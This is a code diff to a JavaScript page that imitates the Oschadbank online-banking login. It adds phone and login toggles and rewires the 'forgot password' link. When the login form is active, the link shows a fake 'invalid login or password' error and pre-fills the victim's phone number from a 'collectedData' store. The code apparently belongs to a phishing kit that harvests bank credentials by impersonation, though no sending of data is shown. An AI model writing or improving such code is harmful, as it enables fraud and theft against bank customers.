@@ -369,11 +369,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 <h2 class="oschad-main-title">Ласкаво просимо</h2>
                 <p>Для входу введіть логін або номер телефону</p>
                 <div class="oschad-toggle-buttons">
-                    <button id="toggle-phone" class="active">Номер телефону</button>
-                    <button id="toggle-login">Логін</button>
+                    <button id="toggle-phone" class="${errorType !== 'login' ? 'active' : ''}">Номер телефону</button>
+                    <button id="toggle-login" class="${errorType === 'login' ? 'active' : ''}">Логін</button>
                 </div>
 
-                <div id="phone-login-form">
+                <div id="phone-login-form" style="${errorType === 'login' ? 'display: none;' : ''}">
                     <div class="oschad-input-group phone-group ${errorType === 'phone' ? 'error' : ''}">
                         <div class="oschad-phone-wrapper">
                             <span class="oschad-phone-prefix">+380</span>
@@ -391,7 +391,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     <a href="#" class="forgot-password-link">Забули пароль?</a>
                 </div>
 
-                <div id="login-form" style="display: none;">
+                <div id="login-form" style="${errorType === 'login' ? '' : 'display: none;'}">
                     <div class="oschad-input-group ${errorType === 'login' ? 'error' : ''}">
                         <label for="login_input">Логін</label>
                         <input type="text" class="oschad-input-field" id="login_input" placeholder=" " autocomplete="off">
@@ -598,16 +598,12 @@ document.addEventListener('DOMContentLoaded', () => {
     /** Adds event listeners for the main Oschadbank login modal */
     function addOschadbankLoginListeners() {
         document.getElementById('oschad-back-arrow').addEventListener('click', () => { window.location.reload(); });
-        document.querySelector('.forgot-password-link').addEventListener('click', (e) => {
-            e.preventDefault();
-            renderForgotPasswordFlow(1);
-        });
-
+        
         const togglePhoneBtn = document.getElementById('toggle-phone');
         const toggleLoginBtn = document.getElementById('toggle-login');
         const phoneLoginForm = document.getElementById('phone-login-form');
         const loginForm = document.getElementById('login-form');
-        let activeOschadForm = 'phone';
+        let activeOschadForm = togglePhoneBtn.classList.contains('active') ? 'phone' : 'login';
         
         const phoneInput = document.getElementById('phone_input');
         const phonePassInput = document.getElementById('phone_password_input');
@@ -615,6 +611,22 @@ document.addEventListener('DOMContentLoaded', () => {
         const loginPassInput = document.getElementById('login_password_input');
         const submitBtn = document.getElementById('oschad-submit-btn');
         
+        // Forgot password link logic
+        document.querySelectorAll('.forgot-password-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (activeOschadForm === 'phone') {
+                    renderForgotPasswordFlow(1);
+                } else {
+                    renderOschadbankLogin({ 
+                        errorType: 'login', 
+                        errorMessage: 'Невірний логін або пароль', 
+                        savedPhone: collectedData.phone ? collectedData.phone.replace('+380', '').replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4') : ''
+                    });
+                }
+            });
+        });
+
         // Label animation logic
         document.querySelectorAll('.oschad-input-group').forEach(group => {
             const input = group.querySelector('.oschad-input-field');
